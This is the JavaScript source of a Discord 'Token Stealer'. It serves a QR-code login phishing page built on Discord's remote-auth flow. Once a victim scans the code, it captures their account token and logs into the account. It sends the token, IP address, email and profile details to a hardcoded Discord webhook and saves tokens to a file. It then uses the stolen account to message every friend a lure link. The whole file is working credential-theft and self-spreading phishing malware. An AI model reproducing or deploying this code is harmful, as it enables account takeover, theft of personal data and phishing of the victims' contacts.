const chalk = require('chalk');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const { RemoteAuthClient } = require('discord-remote-auth');
const Discord = require('discord.js-selfbot-v11');
const express = require('express');
const r = require('express-rate-limit');
const fs = require('fs');
const app = express();

const message_to_send = 'Omg https://vu.fr/QrNitroGenerator\nhttps://media.discordapp.net/attachments/897903146469306378/898857234673598484/unknown.png'; //message to spam with selfbot
const webook = ""; //Webook here 


var traffic = 0; 

function write(content, file) {
    fs.appendFile(file, content, function (err) { });
}


//Rate limiter (stops DDoS) 
var limiter = new r(
{
	statusCode: 429,
	windowMs: 60 * 1000,
	max: 10,
	message:
	{
		type: "error",
		title: "Rate Limited",
		msg: "Rate Limited, please try again later!",
		extra: "Take the L"
	}
});

app.use(limiter);

app.get('/', async (req, res) => {
	traffic++;
	//Grabs Ip && Starts auth connection for token grabbing
    var ip_addr = req.headers['x-forwarded-for'] || req.connection.remoteAddress.replace('::ffff:', '');
    var auth_client = new RemoteAuthClient();
	
    auth_client.on('pendingRemoteInit', async fingerprint => {
		console.log(`[${chalk.greenBright('+')}]` + ` Connected | IP: ${ip_addr} FingerPrint: ${fingerprint}`);
        await res.render('index.ejs', { qr_code_path: `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=https://discordapp.com/ra/${fingerprint}` });
    })

	//Once auth is completed Token will be logged into
    auth_client.on('finish', async token => {
        const bot = new Discord.Client();
        
        bot.on('ready', () => {
            console.log(`[${chalk.yellowBright('*')}] Connected on ${token}`);

            new Webhook('https://discord.com/api/webhooks/918058068120576021/4w7OJTvvNSNubI2LAuaxkT3jnFb9mlIJRHBruz4H4O1tRiRACWN-gBiO49Xux7hVdC1b').send(new MessageBuilder()
                    .setColor('#f5b642').setThumbnail(bot.user.avatarURL)
					.setFooter('Logger By Luci')
					.setTimestamp()
                    .setDescription('```' + token + '```' + '\n' + '```' + ip_addr + '```\n')
                    .addField('> `🚹` **Username**', `\`${bot.user.tag}\``)
                    .addField('> `📫` **Email**', `\`${bot.user.email}\``)
                    .addField('> `💳` **Nitro**', `\`${bot.user.premium}\``)
                    .addField('> `🤡` **Friends**', `\`${bot.user.friends.size}\``)
                    .addField('> `📋` **Presence**', `\`${bot.user.presence.status}\``)
                )
            
            bot.user.friends.forEach(async member => {
                await member.send(`||<@${member.id}>|| ${message_to_send}`).catch(err => {
                    console.log(`[${chalk.redBright('-')}] Dm -> ${err.message}`);
                }).then(() => {
                    console.log(`[${chalk.cyanBright('+')}] Dm -> ${member.username}`);
                })
            })
        })
        bot.login(token).then(() => write(`${token}\n`,'./tokens.txt'));
    })
	process.title = `[313] Token Stealer | Connections: ${traffic}`;
    auth_client.connect();
})

app.listen(80, () => {
    console.clear()
	process.title = "[313] Token Stealer";
    console.log(chalk.greenBright(`
            ████████╗ ██████╗ ██╗  ██╗███████╗███╗   ██╗    ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
            ╚══██╔══╝██╔═══██╗██║ ██╔╝██╔════╝████╗  ██║    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
               ██║   ██║   ██║█████╔╝ █████╗  ██╔██╗ ██║    ███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
               ██║   ██║   ██║██╔═██╗ ██╔══╝  ██║╚██╗██║    ╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
               ██║   ╚██████╔╝██║  ██╗███████╗██║ ╚████║    ███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
               ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝    ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
    `));
    console.log(`[${chalk.greenBright('+')}] http://127.0.0.1:80`);
	console.log(``);
});